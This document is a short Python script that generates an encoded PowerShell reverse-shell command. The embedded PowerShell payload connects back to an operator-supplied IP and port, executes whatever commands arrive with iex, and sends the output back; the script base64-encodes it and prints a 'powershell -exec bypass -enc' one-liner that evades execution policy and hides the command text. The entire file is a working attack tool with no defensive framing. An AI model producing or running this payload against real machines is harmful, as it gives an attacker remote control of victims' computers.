#!/usr/bin/env python3
import sys
import base64

def build_payload(ip, port):
    payload = """
$c = New-Object System.Net.Sockets.TCPClient('{ip}',{port});
$s = $c.GetStream();[byte[]]$b = 0..65535|%{{0}};
while(($i = $s.Read($b, 0, $b.Length)) -ne 0){{
    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
    $sb = (iex $d 2>&1 | Out-String );
    $sb = ([text.encoding]::ASCII).GetBytes($sb + 'ps> ');
    $s.Write($sb,0,$sb.Length);
    $s.Flush()
}};
$c.Close()
""".format(ip=ip, port=port)
    return payload

def encode_payload(payload):
    encoded_bytes = payload.encode('utf-16-le')
    b64 = base64.b64encode(encoded_bytes)
    return b64.decode()

def main():
    if len(sys.argv) < 3:
        print('usage : {} ip port'.format(sys.argv[0]))
        sys.exit(0)
    ip = sys.argv[1]
    port = sys.argv[2]
    payload = build_payload(ip, port)
    encoded = encode_payload(payload)
    print("powershell -exec bypass -enc {}".format(encoded))

if __name__ == '__main__':
    main()
